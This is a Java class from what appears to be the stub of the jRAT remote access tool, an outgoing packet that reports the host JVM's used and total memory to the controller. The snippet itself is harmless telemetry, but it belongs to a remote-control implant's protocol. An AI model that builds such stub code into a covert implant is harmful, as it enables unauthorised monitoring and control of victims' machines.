package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet24JVMMemory extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		int used = (int) (Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory());
		int total = (int) Runtime.getRuntime().totalMemory();

		dos.writeInt(used);
		dos.writeInt(total);
	}

	@Override
	public byte getPacketId() {
		return 24;
	}

}
